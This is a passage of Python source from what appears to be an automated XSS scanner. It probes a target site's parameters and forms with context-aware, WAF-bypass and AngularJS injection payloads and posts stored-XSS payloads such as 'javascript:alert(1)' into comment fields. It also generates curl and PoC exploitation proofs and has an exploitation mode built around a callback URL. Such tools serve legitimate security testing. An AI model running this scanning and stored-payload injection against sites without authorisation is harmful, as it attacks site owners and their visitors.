    def calculate_severity(vuln_data: Dict) -> Tuple[str, float, str]:
        """
        Calculate severity based on multiple factors
        
        Args:
            vuln_data: Vulnerability data dictionary
        
        Returns:
            Tuple of (severity_level, score, reasoning)
        """
        score = 5.0  # Base score
        factors = []
        
        # Type of XSS
        xss_type = vuln_data.get('type', 'reflected_xss')
        if 'stored' in xss_type.lower():
            score += 3.0
            factors.append("Stored XSS (+3.0)")
        elif 'reflected' in xss_type.lower():
            score += 1.5
            factors.append("Reflected XSS (+1.5)")
        else:
            score += 0.5
            factors.append("DOM-based XSS (+0.5)")
        
        # CSP analysis
        csp_info = vuln_data.get('csp_analysis', {})
        if not csp_info.get('present', False):
            score += 1.5
            factors.append("No CSP (+1.5)")
        elif csp_info.get('allows_unsafe', False):
            score += 0.5
            factors.append("Weak CSP (+0.5)")
        else:
            score -= 2.0
            factors.append("Strong CSP but bypassed (-2.0)")
        
        # Authentication requirement
        requires_auth = vuln_data.get('requires_auth', False)
        if not requires_auth:
            score += 1.0
            factors.append("No authentication required (+1.0)")
        else:
            score -= 0.5
            factors.append("Authentication required (-0.5)")
        
        # HTTP-only cookies
        has_httponly = vuln_data.get('httponly_cookies', True)
        if not has_httponly:
            score += 0.5
            factors.append("Cookies not HTTPOnly (+0.5)")
        
        # Cap score at 10.0
        score = min(10.0, score)
        
        # Determine severity level
        if score >= 9.0:
            severity = 'critical'
        elif score >= 7.0:
            severity = 'high'
        elif score >= 4.0:
            severity = 'medium'
        else:
            severity = 'low'
        
        reasoning = "; ".join(factors)
        
        return severity, score, reasoning


def advanced_xss_scan(url: str, 
                      mode: str = 'advanced',
                      custom_payloads_file: Optional[str] = None,
                      callback_url: Optional[str] = None,
                      timeout: int = 10,
                      headers: Optional[Dict[str, str]] = None,
                      enable_param_discovery: bool = True,
                      safe_mode: bool = True,
                      arjun_threads: int = 10,
                      arjun_timeout: int = 120,
                      arjun_wordlist: Optional[str] = None,
                      fallback_params: Optional[List[str]] = None,
                      max_payloads_per_param: int = 20,
                      enable_stored_workflow: bool = True,
                      browser_verify: bool = False) -> List[Dict]:
    """
    Advanced XSS scanning with context detection and exploitation proofs
    
    Args:
        url: Target URL to scan
        mode: Scan mode ('basic', 'advanced', 'exploitation')
        custom_payloads_file: Path to custom payloads file
        callback_url: Callback URL for blind XSS testing
        timeout: Request timeout in seconds
        enable_param_discovery: Use Arjun to discover hidden parameters
    
    Returns:
        List of vulnerability dictionaries with detailed information
    """
    vulnerabilities = []
    attempted_payloads = 0
    
    # Select payloads based on mode and safety
    if safe_mode:
        base_payloads = XSSPayloads.get_basic_payloads()
    elif mode == 'basic':
        base_payloads = XSSPayloads.get_basic_payloads()
    elif mode == 'exploitation' and callback_url:
        base_payloads = XSSPayloads.generate_exploitation_payloads(callback_url)
    else:
        base_payloads = XSSPayloads.get_all_payloads()
    
    # Add custom payloads if provided
    if custom_payloads_file:
        custom_payloads = load_custom_payloads(custom_payloads_file)
        base_payloads.extend(custom_payloads)
    
    log(f"Starting advanced XSS scan on {url} (mode: {mode})", 'INFO')
    log(f"Using {len(base_payloads)} payloads", 'INFO')
    
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
            # Initial request to analyze CSP and get forms
            initial_response = client.get(url)
            
            # Analyze CSP
            csp_analysis = CSPAnalyzer.analyze_csp(
                CSPAnalyzer.extract_csp(dict(initial_response.headers))
            )
            
            log(f"CSP Analysis: {csp_analysis['potential_bypasses']}", 'INFO')
            
            # Extract forms
            forms = extract_forms(initial_response.text)
            stored_verify_urls: List[str] = []
            stored_pages: List[Tuple[str, str]] = [(url, initial_response.text or "")]
            for f in forms:
                try:
                    f.setdefault('_source_url', url)
                except Exception:
                    pass
            _log_form_summary(forms)

            # For stored-XSS workflows, we often need to find forms that live on content pages
            # (for example individual blog posts). Do a same-origin crawl to collect pages/forms.
            if enable_stored_workflow:
                try:
                    has_post_form = any((frm.get('method') or '').upper() == 'POST' for frm in forms)
                except Exception:
                    has_post_form = False
                try:
                    crawl_max_pages = 20 if not has_post_form else 10
                    crawl_max_depth = 2 if not has_post_form else 1
                    pages = _crawl_in_scope_pages(
                        url,
                        max_pages=crawl_max_pages,
                        max_depth=crawl_max_depth,
                        timeout=timeout,
                        headers=headers,
                    )
                    stored_pages.extend(pages)
                    if not has_post_form:
                        for page_url, page_html in pages:
                            for frm in extract_forms(page_html):
                                frm['_source_url'] = page_url
                                forms.append(frm)
                        # Re-log summary if we added forms
                        _log_form_summary(forms)
                except Exception:
                    pass
                try:
                    stored_verify_urls = _build_in_scope_verify_urls(url, stored_pages, max_urls=30)
                except Exception:
                    stored_verify_urls = [url]
            
            # Parse URL parameters
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            baseline_params = dict(params)

            def _copy_baseline_params() -> Dict[str, List[str]]:
                return {k: (list(v) if isinstance(v, list) else [str(v)]) for k, v in baseline_params.items()}

            # Harvest params from HTML/JS
            log("Harvesting parameters from HTML/JS...", 'INFO')
            harvested = _harvest_params_from_html(
                f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                initial_response.text
            )
            harvested_count_html = len(harvested)
            harvested.extend(_harvest_params_from_js_sources(
                f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                initial_response.text,
                timeout,
                headers=headers,
            ))
            harvested_count_total = len(harvested)
            filtered_harvested = _filter_param_names(harvested) if harvested else []
            log(
                f"Harvester complete: html={harvested_count_html}, html+js={harvested_count_total}, valid={len(filtered_harvested)}",
                'INFO'
            )
            if filtered_harvested:
                log(f"Harvested {len(filtered_harvested)} parameter(s) from HTML/JS: {', '.join(filtered_harvested)}", 'INFO')
                for param in filtered_harvested:
                    params.setdefault(param, ['test'])
            
            # Collect parameter names from GET forms
            form_get_params = set()
            form_post_params = set()
            for form in forms:
                form_method = (form.get('method') or 'GET').upper()
                for inp in form.get('inputs', []):
                    name = inp.get('name')
                    if not name:
                        continue
                    if form_method == 'GET':
                        form_get_params.add(name)
                    else:
                        form_post_params.add(name)
            
            if form_get_params:
                log(f"Discovered {len(form_get_params)} GET form parameter(s): {', '.join(sorted(form_get_params))}", 'INFO')
                for param in form_get_params:
                    params.setdefault(param, ['test'])
            
            # Arjun parameter discovery (if enabled)
            discovered_params = []
            if enable_param_discovery and mode in ['advanced', 'exploitation']:
                log("Running Arjun parameter discovery...", 'INFO')
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                arjun_result = discover_parameters(
                    base_url,
                    method='GET',
                    threads=arjun_threads,
                    timeout=arjun_timeout,
                    wordlist=arjun_wordlist
                )
                if arjun_result['parameters']:
                    discovered_params = _filter_param_names(arjun_result['parameters'])
                    if discovered_params:
                        log(f"Arjun found {len(discovered_params)} hidden parameters: {', '.join(discovered_params)}", 'INFO')
                    # Add discovered params to test list
                    for param in discovered_params:
                        params.setdefault(param, ['test'])
            
            if not params:
                # Try common parameter names
                common_params = fallback_params or ['q', 'search', 'query', 'keyword', 'term', 'id', 'page', 'url', 'redirect', 'name', 'input', 'data']
                params = {param: ['test'] for param in common_params}
            _log_parameter_summary(params)
            
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Context detection phase - use unique marker
            marker = "__XSS_CONTEXT_MARKER_12345__"
            context_map = {}
            
            # Detect context for each parameter
            for param_name in params.keys():
                test_params = _copy_baseline_params()
                test_params[param_name] = [marker]
                flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                
                try:
                    response = client.get(base_url, params=flat_params)
                    context = ContextDetector.detect_context(response.text, marker, marker)
                    context_map[param_name] = context
                    log(f"Parameter '{param_name}' context: {context}", 'INFO')
                except:
                    context_map[param_name] = 'unknown'
            
            # Test GET parameters with context-aware payloads
            browser_verifications = 0
            for param_name, context in context_map.items():
                log(f"Testing XSS on GET parameter: {param_name} (context: {context})", 'INFO')

                # Tag/event allowlist bypass technique for filtered reflected inputs.
                try:
                    allowlist_vuln = _probe_tag_event_allowlist_xss(
                        client=client,
                        base_url=base_url,
                        param_name=param_name,
                        baseline_params=baseline_params,
                        headers=headers,
                        browser_verify=browser_verify,
                    )
                    if allowlist_vuln:
                        vulnerabilities.append(allowlist_vuln)
                        log(f"XSS FOUND: tag/event allowlist bypass via {param_name}", "VULN")
                        continue
                except Exception:
                    pass

                # AngularJS expression injection technique (ng-app directive)
                # Only attempt once per parameter to avoid slowing down the scan.
                try:
                    test_params = _copy_baseline_params()
                    test_params[param_name] = [ANGULARJS_EXPR_PAYLOAD]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                    ang_resp = client.get(base_url, params=flat_params)
                    ang_reflected = ANGULARJS_EXPR_PAYLOAD in (ang_resp.text or "")
                    if ang_reflected and _looks_like_angularjs(ang_resp.text or "") and _reflected_in_ng_app(ang_resp.text or "", ANGULARJS_EXPR_PAYLOAD):
                        verified = False
                        if browser_verify and browser_verifications < MAX_BROWSER_VERIFICATIONS_PER_TARGET:
                            verify_url = str(ang_resp.url)
                            log(f"Browser-verifying AngularJS expression injection: {verify_url}", "INFO")
                            verified = verify_alert_with_playwright(verify_url, headers=headers)
                            browser_verifications += 1
                            log(f"Browser verification result: {verified}", "INFO")

                        curl_cmd = ExploitationProofGenerator.generate_curl_command('GET', base_url, flat_params, headers=headers)
                        browser_steps = ExploitationProofGenerator.generate_browser_steps('GET', str(ang_resp.url), param_name, ANGULARJS_EXPR_PAYLOAD)
                        vulnerabilities.append(
                            {
                                "type": "reflected_xss",
                                "method": "GET",
                                "parameter": param_name,
                                "payload": ANGULARJS_EXPR_PAYLOAD,
                                "url": str(ang_resp.url),
                                "context": "angularjs-ng-app",
                                "severity": "high" if (not browser_verify or verified) else "medium",
                                "technique_id": ANGULARJS_TECHNIQUE_ID,
                                "technique_name": ANGULARJS_TECHNIQUE_NAME,
                                "description": f"AngularJS expression injection reflected into ng-app via GET parameter \"{param_name}\"" + (" (verified)" if verified else ""),
                                "discovery_method": "AngularJS ng-app directive reflection",
                                "verified": bool(verified) if browser_verify else False,
                                "exploitation": {
                                    "curl_command": curl_cmd,
                                    "browser_steps": browser_steps,
                                },
                            }
                        )
                        log(f"XSS FOUND: AngularJS expression injection via {param_name}", "VULN")
                        # Continue scanning for other issues; don't early-break the entire param loop.
                except Exception:
                    pass
                
                # Get context-specific payloads
                if safe_mode:
                    context_payloads = XSSPayloads.get_basic_payloads()
                else:
                    context_payloads = XSSPayloads.get_context_payloads(context)
                
                # Add WAF bypass payloads for advanced mode (unsafe only)
                if not safe_mode and mode == 'advanced':
                    context_payloads.extend(XSSPayloads.get_waf_bypass_payloads())
                context_payloads = _prioritize_payloads_for_param(param_name, context_payloads)

                # Debug: show which payloads are about to be tested (bounded)
                preview_payloads = context_payloads[:min(PAYLOAD_DEBUG_LOG_LIMIT, len(context_payloads))]
                if preview_payloads:
                    preview_str = ", ".join([repr(_short_payload(p, 80)) for p in preview_payloads])
                    log(f"Payload preview for '{param_name}': {preview_str}", 'DEBUG')
                if param_name.lower() == 'search':
                    log(
                        f"Search priority payload enabled: {SEARCH_PRIORITY_PAYLOAD in context_payloads} (first={context_payloads[0] == SEARCH_PRIORITY_PAYLOAD})",
                        'DEBUG'
                    )

                debug_attempts_logged = 0
                adaptive_used = False
                
                for payload in context_payloads[:max_payloads_per_param]:  # Limit to prevent excessive requests
                    attempted_payloads += 1
                    test_params = _copy_baseline_params()
                    test_params[param_name] = [payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                    
                    try:
                        response = client.get(base_url, params=flat_params)

                        reflected = payload in response.text
                        vuln_ok = reflected and is_xss_vulnerable(response.text, payload, expected_context=context)
                        if debug_attempts_logged < PAYLOAD_DEBUG_LOG_LIMIT:
                            debug_attempts_logged += 1
                            log(
                                f"Attempt[{param_name}] payload={repr(_short_payload(payload))} reflected={reflected} vuln={vuln_ok} expected_context={context} status={getattr(response,'status_code',None)}",
                                'DEBUG'
                            )

                        if vuln_ok:
                            # Calculate severity
                            vuln_data = {
                                'type': 'reflected_xss',
                                'csp_analysis': csp_analysis,
                                'requires_auth': False,  # Could be detected from response
                                'httponly_cookies': 'httponly' in str(response.headers.get('set-cookie', '')).lower(),
                            }
                            
                            severity, score, reasoning = SeverityScorer.calculate_severity(vuln_data)
                            
                            # Generate exploitation proof
                            curl_cmd = ExploitationProofGenerator.generate_curl_command(
                                'GET', base_url, flat_params, headers=headers
                            )
                            
                            browser_steps = ExploitationProofGenerator.generate_browser_steps(
                                'GET', str(response.url), param_name, payload
                            )
                            
                            poc_html = ExploitationProofGenerator.generate_poc_html(
                                'GET', base_url, flat_params, payload
                            )
                            
                            # Mark if discovered by Arjun
                            discovery_method = 'Arjun' if param_name in discovered_params else 'URL parsing'
                            
                            vuln = {
                                'type': 'reflected_xss',
                                'method': 'GET',
                                'parameter': param_name,
                                'payload': payload,
                                'url': str(response.url),
                                'context': context,
                                'severity': severity,
                                'cvss_score': score,
                                'severity_reasoning': reasoning,
                                'description': f'Reflected XSS in GET parameter "{param_name}" (context: {context})',
                                'discovery_method': discovery_method,
                                'csp_analysis': csp_analysis,
                                'exploitation': {
                                    'curl_command': curl_cmd,
                                    'browser_steps': browser_steps,
                                    'poc_html': poc_html,
                                },
                            }
                            # Tag known technique when we inject an attribute event handler breakout.
                            if isinstance(payload, str) and 'onmouseover' in payload.lower():
                                vuln['technique_id'] = ATTR_EVENT_HANDLER_TECHNIQUE_ID
                                vuln['technique_name'] = ATTR_EVENT_HANDLER_TECHNIQUE_NAME
                            if payload == JS_STRING_BREAKOUT_PAYLOAD:
                                vuln['technique_id'] = JS_STRING_BREAKOUT_TECHNIQUE_ID
                                vuln['technique_name'] = JS_STRING_BREAKOUT_TECHNIQUE_NAME
                            if payload == JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD:
                                vuln['technique_id'] = JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_ID
                                vuln['technique_name'] = JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_NAME
                            
                            vulnerabilities.append(vuln)
                            log(f"XSS FOUND: {param_name} (severity: {severity}, score: {score}, discovered via: {discovery_method})", 'VULN')
                            break  # Move to next parameter after finding vulnerability
                        elif reflected:
                            if adaptive_used:
                                continue
                            adaptive_used = True
                            observed_context = _guess_reflection_context(response.text, payload)
                            if debug_attempts_logged <= PAYLOAD_DEBUG_LOG_LIMIT:
                                log(
                                    f"Reflected but not vulnerable[{param_name}] observed_context={observed_context} expected_context={context} payload={repr(_short_payload(payload))}",
                                    'DEBUG'
                                )
                            adaptive_payloads = [payload] + _adaptive_candidate_payloads(observed_context, safe_mode=safe_mode)
                            for ap in adaptive_payloads:
                                variants = [ap] + _adaptive_prefix_variants(ap, observed_context)
                                seen_v = set()
                                for variant in variants:
                                    if variant in seen_v:
                                        continue
                                    seen_v.add(variant)
                                    attempted_payloads += 1
                                    test_params_variant = _copy_baseline_params()
                                    test_params_variant[param_name] = [variant]
                                    flat_variant = {k: v[0] if isinstance(v, list) else v for k, v in test_params_variant.items()}
                                    try:
                                        response_variant = client.get(base_url, params=flat_variant)
                                        if variant in response_variant.text and is_xss_vulnerable(response_variant.text, variant, expected_context=observed_context):
                                            vuln_data = {
                                                'type': 'reflected_xss',
                                                'csp_analysis': csp_analysis,
                                                'requires_auth': False,
                                                'httponly_cookies': 'httponly' in str(response_variant.headers.get('set-cookie', '')).lower(),
                                            }
                                            severity, score, reasoning = SeverityScorer.calculate_severity(vuln_data)

                                            curl_cmd = ExploitationProofGenerator.generate_curl_command(
                                                'GET', base_url, flat_variant, headers=headers
                                            )
                                            browser_steps = ExploitationProofGenerator.generate_browser_steps(
                                                'GET', str(response_variant.url), param_name, variant
                                            )
                                            poc_html = ExploitationProofGenerator.generate_poc_html(
                                                'GET', base_url, flat_variant, variant
                                            )

                                            vuln_data = {
                                                'type': 'reflected_xss',
                                                'method': 'GET',
                                                'parameter': param_name,
                                                'payload': variant,
                                                'url': str(response_variant.url),
                                                'context': observed_context,
                                                'severity': severity,
                                                'cvss_score': score,
                                                'severity_reasoning': reasoning,
                                                'description': f'Reflected XSS in GET parameter "{param_name}" (context: {observed_context})',
                                                'discovery_method': discovery_method,
                                                'csp_analysis': csp_analysis,
                                                'exploitation': {
                                                    'curl_command': curl_cmd,
                                                    'browser_steps': browser_steps,
                                                    'poc_html': poc_html,
                                                },
                                            }
                                            if isinstance(variant, str) and 'onmouseover' in variant.lower():
                                                vuln_data['technique_id'] = ATTR_EVENT_HANDLER_TECHNIQUE_ID
                                                vuln_data['technique_name'] = ATTR_EVENT_HANDLER_TECHNIQUE_NAME
                                            if variant == JS_STRING_BREAKOUT_PAYLOAD:
                                                vuln_data['technique_id'] = JS_STRING_BREAKOUT_TECHNIQUE_ID
                                                vuln_data['technique_name'] = JS_STRING_BREAKOUT_TECHNIQUE_NAME
                                            if variant == JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD:
                                                vuln_data['technique_id'] = JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_ID
                                                vuln_data['technique_name'] = JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_NAME
                                            vulnerabilities.append(vuln_data)
                                            log(f"XSS FOUND (adaptive): {param_name} (context: {observed_context})", 'VULN')
                                            break
                                    except Exception:
                                        continue
                                else:
                                    continue
                                break
                        else:
                            # DOM XSS / client-side execution can be invisible in response.text.
                            # If enabled, use a headless browser to verify whether the payload triggers an alert.
                            if browser_verify and browser_verifications < MAX_BROWSER_VERIFICATIONS_PER_TARGET and _should_browser_verify_param(param_name):
                                # Only verify a small number of early payloads to keep runtime bounded.
                                if debug_attempts_logged <= PAYLOAD_DEBUG_LOG_LIMIT:
                                    verify_url = str(response.url)
                                    minimal_url = _build_minimal_get_exploit_url(url, base_url, param_name, payload)
                                    log(f"Browser-verifying potential client-side XSS: {verify_url}", 'INFO')
                                    ok = verify_alert_with_playwright(verify_url, headers=headers)
                                    browser_verifications += 1
                                    log(f"Browser verification result: {ok}", 'INFO')
                                    if ok:
                                        browser_steps = ExploitationProofGenerator.generate_browser_steps(
                                            'GET', minimal_url, param_name, payload
                                        )
                                        vulnerabilities.append({
                                            'type': 'dom_xss',
                                            'method': 'GET',
                                            'parameter': param_name,
                                            'payload': payload,
                                            'url': minimal_url,
                                            'context': 'browser_verified',
                                            'severity': 'high',
                                            'cvss_score': 8.0,
                                            'severity_reasoning': 'Browser-verified JavaScript execution (alert dialog observed)',
                                            'description': f'DOM/Client-side XSS via GET parameter "{param_name}" (browser verified)',
                                            'discovery_method': 'Browser verification',
                                            'exploitation': {
                                                'browser_steps': browser_steps,
                                            },
                                            'evidence': {
                                                'verified_url': verify_url,
                                            },
                                            'verified': True,
                                        })
                                        log(f"XSS FOUND (browser verified): {param_name}", 'VULN')
                                        break
                    
                    except httpx.TimeoutException:
                        log(f"Timeout testing {param_name}", 'WARN')
                        break
                    except Exception as e:
                        log(f"Error testing {param_name}: {str(e)[:100]}", 'DEBUG')
                        continue
            
            # Test forms
            if forms:
                log(f"Found {len(forms)} form(s) to test", 'INFO')
                
                for form_idx, form in enumerate(forms):
                    if not form['inputs']:
                        continue
                    
                    form_action = form['action']
                    base_for_form = form.get('_source_url') or url
                    form_url = urllib.parse.urljoin(base_for_form, form_action) if form_action else base_for_form
                    
                    # Similar testing for forms (abbreviated for length)
                    for input_field in form['inputs']:
                        if input_field['type'] in ['submit', 'button', 'image']:
                            continue
                        
                        field_name = input_field['name']

                        # AngularJS expression injection via reflected ng-app directive
                        try:
                            if (form.get('method') or 'GET').upper() == 'GET':
                                form_data = {}
                                for inp in form['inputs']:
                                    n = inp.get('name')
                                    if not n:
                                        continue
                                    form_data[n] = ANGULARJS_EXPR_PAYLOAD if n == field_name else (inp.get('value') or 'test')
                                ang_resp = client.get(form_url, params=form_data)
                                ang_reflected = ANGULARJS_EXPR_PAYLOAD in (ang_resp.text or "")
                                if ang_reflected and _looks_like_angularjs(ang_resp.text or "") and _reflected_in_ng_app(ang_resp.text or "", ANGULARJS_EXPR_PAYLOAD):
                                    verified = False
                                    if browser_verify and browser_verifications < MAX_BROWSER_VERIFICATIONS_PER_TARGET:
                                        verify_url = str(ang_resp.url)
                                        log(f"Browser-verifying AngularJS expression injection: {verify_url}", "INFO")
                                        verified = verify_alert_with_playwright(verify_url, headers=headers)
                                        browser_verifications += 1
                                        log(f"Browser verification result: {verified}", "INFO")

                                    vulnerabilities.append(
                                        {
                                            "type": "reflected_xss",
                                            "method": "GET",
                                            "parameter": field_name,
                                            "payload": ANGULARJS_EXPR_PAYLOAD,
                                            "url": str(ang_resp.url),
                                            "context": "angularjs-ng-app",
                                            "severity": "high" if (not browser_verify or verified) else "medium",
                                            "technique_id": ANGULARJS_TECHNIQUE_ID,
                                            "technique_name": ANGULARJS_TECHNIQUE_NAME,
                                            "description": f"AngularJS expression injection reflected into ng-app via GET form input \"{field_name}\"" + (" (verified)" if verified else ""),
                                            "discovery_method": "Form extraction (AngularJS ng-app)",
                                            "verified": bool(verified) if browser_verify else False,
                                        }
                                    )
                                    log(f"XSS FOUND: AngularJS expression injection in form input {field_name}", "VULN")
                                    break
                        except Exception:
                            pass
                        
                        # Test with basic payloads for forms
                        adaptive_used_form = False
                        for payload in XSSPayloads.get_basic_payloads()[:max_payloads_per_param]:
                            attempted_payloads += 1
                            form_data = {}
                            for inp in form['inputs']:
                                form_data[inp['name']] = payload if inp['name'] == field_name else (inp['value'] or 'test')
                            
                            try:
                                if form['method'] == 'POST':
                                    response = client.post(form_url, data=form_data)
                                else:
                                    response = client.get(form_url, params=form_data)
                                
                                if payload in response.text and is_xss_vulnerable(response.text, payload):
                                    # Similar vulnerability recording as GET parameters
                                    vulnerabilities.append({
                                        'type': 'reflected_xss',
                                        'method': form['method'],
                                        'parameter': field_name,
                                        'payload': payload,
                                        'url': form_url,
                                        'severity': 'high',
                                        'description': f'Reflected XSS in {form["method"]} form input "{field_name}"',
                                        'discovery_method': 'Form extraction',
                                    })
                                    log(f"XSS FOUND: Form input {field_name}", 'VULN')
                                    break
                                elif payload in response.text:
                                    if adaptive_used_form:
                                        continue
                                    adaptive_used_form = True
                                    observed_context = _guess_reflection_context(response.text, payload)
                                    adaptive_payloads = [payload] + _adaptive_candidate_payloads(observed_context, safe_mode=safe_mode)
                                    for ap in adaptive_payloads:
                                        variants = [ap] + _adaptive_prefix_variants(ap, observed_context)
                                        seen_v = set()
                                        for variant in variants:
                                            if variant in seen_v:
                                                continue
                                            seen_v.add(variant)
                                            try:
                                                attempted_payloads += 1
                                                form_data_variant = form_data.copy()
                                                form_data_variant[field_name] = variant
                                                if form['method'] == 'POST':
                                                    response_variant = client.post(form_url, data=form_data_variant)
                                                else:
                                                    response_variant = client.get(form_url, params=form_data_variant)
                                                if variant in response_variant.text and is_xss_vulnerable(response_variant.text, variant):
                                                    curl_cmd = ExploitationProofGenerator.generate_curl_command(
                                                        form['method'], form_url, form_data_variant, headers=headers
                                                    )
                                                    browser_steps = ExploitationProofGenerator.generate_browser_steps(
                                                        form['method'], str(response_variant.url), field_name, variant
                                                    )
                                                    vulnerabilities.append({
                                                        'type': 'reflected_xss',
                                                        'method': form['method'],
                                                        'parameter': field_name,
                                                        'payload': variant,
                                                        'url': form_url,
                                                        'severity': 'high',
                                                        'description': f'Reflected XSS in {form["method"]} form input "{field_name}"',
                                                        'discovery_method': 'Form extraction',
                                                        'exploitation': {
                                                            'curl_command': curl_cmd,
                                                            'browser_steps': browser_steps,
                                                        },
                                                    })
                                                    log(f"XSS FOUND (adaptive): Form input {field_name}", 'VULN')
                                                    break
                                            except Exception:
                                                continue
                                        else:
                                            continue
                                        break
                            except:
                                continue

                    # Stored XSS workflow (POST forms with comment-like fields)
                    if enable_stored_workflow and form.get('method', 'GET').upper() == 'POST':
                        comment_fields = [inp.get('name') for inp in form.get('inputs', []) if _is_comment_field(inp.get('name', ''))]
                        if not comment_fields:
                            comment_fields = _candidate_stored_text_fields(form)
                            if comment_fields:
                                log(f"Stored-XSS fallback fields selected: {', '.join(comment_fields)}", 'DEBUG')
                        if comment_fields:
                            for field_name in comment_fields:
                                def _stored_verify_candidates_from_response(post_response) -> List[str]:
                                    verify_candidates = []
                                    verify_candidates.extend(stored_verify_urls)
                                    location = post_response.headers.get('location')
                                    if location:
                                        verify_candidates.append(urllib.parse.urljoin(form_url, location))
                                    source_url = form.get('_source_url') or None
                                    if source_url:
                                        verify_candidates.append(source_url)
                                    verify_candidates.append(form_url)
                                    verify_candidates.append(url)
                                    return verify_candidates

                                marker = _random_token(12)
                                marker_form_data = _build_form_payload(form, field_name, marker)
                                marker_render_urls: List[str] = []
                                try:
                                    marker_resp = client.post(form_url, data=marker_form_data)
                                    if marker_resp.status_code < 400:
                                        seen_marker_urls = set()
                                        for verify_url in _stored_verify_candidates_from_response(marker_resp):
                                            if verify_url in seen_marker_urls:
                                                continue
                                            seen_marker_urls.add(verify_url)
                                            try:
                                                verify_resp = client.get(verify_url)
                                            except Exception:
                                                continue
                                            if marker in (verify_resp.text or ""):
                                                marker_render_urls.append(verify_url)
                                        if marker_render_urls:
                                            log(
                                                f"Stored marker rendered for field '{field_name}' at: {', '.join(marker_render_urls[:3])}",
                                                'DEBUG',
                                            )
                                        elif _looks_like_comment_submission_success(marker_resp.text or ""):
                                            log(
                                                f"Stored marker accepted for field '{field_name}' but not immediately rendered (possible moderation/delay).",
                                                'DEBUG',
                                            )
                                except Exception:
                                    pass

                                stored_candidates = _build_stored_comment_payloads(max_payloads_per_param)
                                for payload in stored_candidates:
                                    try:
                                        attempted_payloads += 1
                                        form_data = _build_form_payload(form, field_name, payload)
                                        post_resp = client.post(form_url, data=form_data)
                                        if post_resp.status_code >= 400:
                                            continue

                                        verify_candidates = []
                                        verify_candidates.extend(marker_render_urls)
                                        verify_candidates.extend(_stored_verify_candidates_from_response(post_resp))
                                        seen = set()
                                        for verify_url in verify_candidates:
                                            if verify_url in seen:
                                                continue
                                            seen.add(verify_url)
                                            verify_resp = client.get(verify_url)
                                            direct_stored_xss = payload in verify_resp.text and is_xss_vulnerable(verify_resp.text, payload)
                                            replace_bypass_stored_xss = False
                                            if payload == STORED_REPLACE_FIRST_ONLY_PAYLOAD or payload in STORED_REPLACE_FIRST_ONLY_ALT_PAYLOADS:
                                                body = verify_resp.text or ""
                                                replace_bypass_stored_xss = _matches_replace_first_occurrence_bypass(body)
                                            if direct_stored_xss or replace_bypass_stored_xss:
                                                verified = False
                                                if browser_verify:
                                                    try:
                                                        verified = verify_alert_with_playwright(verify_url, headers=headers)
                                                    except Exception:
                                                        verified = False
                                                vuln_data = {
                                                    'type': 'stored_xss',
                                                    'method': 'POST',
                                                    'parameter': field_name,
                                                    'payload': payload,
                                                    'url': verify_url,
                                                    'severity': 'critical' if (not browser_verify or verified) else 'high',
                                                    'description': f'Stored XSS via POST form input "{field_name}"',
                                                    'discovery_method': 'Stored form workflow',
                                                    'verified': bool(verified) if browser_verify else False,
                                                }
                                                if payload == STORED_REPLACE_FIRST_ONLY_PAYLOAD or payload in STORED_REPLACE_FIRST_ONLY_ALT_PAYLOADS:
                                                    vuln_data['technique_id'] = STORED_REPLACE_FIRST_ONLY_TECHNIQUE_ID
                                                    vuln_data['technique_name'] = STORED_REPLACE_FIRST_ONLY_TECHNIQUE_NAME
                                                    vuln_data['description'] = f'Stored XSS via single-occurrence angle bracket encoding bypass in "{field_name}"' + (" (verified)" if (browser_verify and verified) else "")
                                                vulnerabilities.append(vuln_data)
                                                log(f"STORED XSS FOUND: Form input {field_name}", 'VULN')
                                                break
                                        else:
                                            continue
                                        break
                                    except Exception:
                                        continue

                        # Stored injection into anchor href via "website"/URL field (javascript: URL)
                        website_fields = []
                        for inp in form.get('inputs', []):
                            n = (inp.get('name') or '').strip()
                            it = (inp.get('type') or '').lower()
                            if not n:
                                continue
                            if it == 'url' or _is_website_field(n):
                                website_fields.append(n)

                        if website_fields:
                            website_field = website_fields[0]
                            source_url = form.get('_source_url') or form_url or url
                            marker = _random_token(12)
                            try:
                                form_data = _build_form_payload(form, website_field, marker)
                                post_resp = client.post(form_url, data=form_data)
                                if post_resp.status_code < 400:
                                    verify_candidates = []
                                    location = post_resp.headers.get('location')
                                    if location:
                                        verify_candidates.append(urllib.parse.urljoin(form_url, location))
                                    verify_candidates.append(source_url)
                                    verify_candidates.append(form_url)
                                    verify_candidates.append(url)

                                    verify_url = None
                                    for cand in verify_candidates:
                                        try:
                                            vr = client.get(cand)
                                            if vr.status_code < 400 and _payload_in_anchor_href(vr.text or "", marker):
                                                verify_url = cand
                                                break
                                        except Exception:
                                            continue

                                    if verify_url:
                                        js_payload = "javascript:alert(1)"
                                        form_data_js = _build_form_payload(form, website_field, js_payload)
                                        post_resp2 = client.post(form_url, data=form_data_js)
                                        if post_resp2.status_code < 400:
                                            vr2 = client.get(verify_url)
                                            if vr2.status_code < 400 and _payload_in_anchor_href(vr2.text or "", js_payload):
                                                curl_cmd = ExploitationProofGenerator.generate_curl_command(
                                                    'POST', form_url, form_data_js, headers=headers
                                                )
                                                vulnerabilities.append({
                                                    'type': 'stored_xss',
                                                    'method': 'POST',
                                                    'parameter': website_field,
                                                    'payload': js_payload,
                                                    'url': verify_url,
                                                    'context': 'href attribute',
                                                    'severity': 'high',
                                                    'technique_id': STORED_HREF_JS_TECHNIQUE_ID,
                                                    'technique_name': STORED_HREF_JS_TECHNIQUE_NAME,
                                                    'description': f'Stored XSS via "{website_field}" reflected into <a href> as a javascript: URL',
                                                    'discovery_method': 'Stored workflow (website->href)',
                                                    'exploitation': {
                                                        'curl_command': curl_cmd,
                                                        'browser_steps': [
